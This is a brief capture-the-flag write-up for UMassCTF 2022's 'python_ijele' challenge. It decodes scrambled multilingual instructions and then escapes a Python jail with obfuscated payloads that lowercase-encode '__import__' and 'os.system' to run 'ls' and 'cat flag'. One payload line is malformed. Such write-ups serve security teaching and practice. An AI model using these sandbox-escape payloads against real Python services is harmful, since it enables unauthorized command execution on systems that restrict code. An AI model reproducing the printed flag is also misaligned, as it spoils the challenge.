# UMassCTF 2022 - python_ijele
- Write-Up Author: Wendy \[[MOCTF](https://www.facebook.com/MOCSCTF)\]

- Flag: UMASS{congrats-now-you-are-multilingual}

## **Question:**
python_ijele

>Challenge description

Google translate broke when I was making the instructions for this python jail

nc 34.148.103.218 1227

## Write up

From the challenge description, I need to translate below instruction.
```
wewe have aqhephukile benim bahasa codice. Unesi la palabra sapi in Pelekania
```

```
Translated by Google: You have to cracked my language code. Join the word cow
```

Great! Type 'cow' to contines the challenge. Then I start to escape Python Jail.

```
print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()))

```

![img](./img/1.png)

```

print(__builtins__.__dict__['__IMPORT__'.lower()]('cat flag))

```

![img](./img/2.png)

```
print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('ls'))

```

![img](./img/3.png)


```
print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat flag'))

```

![img](./img/4.png)

> UMASS{congrats-now-you-are-multilingual}
